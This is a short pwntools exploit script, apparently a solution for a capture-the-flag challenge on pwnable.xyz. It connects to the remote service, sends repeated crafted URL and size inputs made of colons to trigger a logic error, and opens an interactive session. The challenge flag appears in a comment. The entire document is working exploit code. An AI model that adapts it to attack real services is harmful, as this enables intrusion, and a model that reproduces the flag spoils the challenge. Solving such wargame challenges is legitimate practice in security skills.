from pwn import *
import time

buffer_size = 0x202300 - 0x202200 # = 0x100
buffer_size = 0x100

context.terminal = ['kitty', '-e']

# r = process('challenge')
r = remote('svc.pwnable.xyz', 30021)
r.sendlineafter('> ', '2')

url = "http::::"
r.sendafter(": ", url)
size = 0x80 - 4
r.sendlineafter(": ", str(size))
r.send(":" * size)

r.sendlineafter('> ', '2')
r.sendafter(": ", url)
r.sendlineafter(": ", str(size))
r.send(":" * size)

r.sendlineafter('> ', '2')
r.sendafter(": ", url)
r.sendlineafter(": ", '16')
r.send(":" * 16)
r.interactive()

# gdb.attach(r)
# time.sleep(1)

r.sendlineafter('> ', '4')

r.interactive()

# flag; FLAG{l0gic_error_ch3cked}


'''
0x80 bytes 
'''
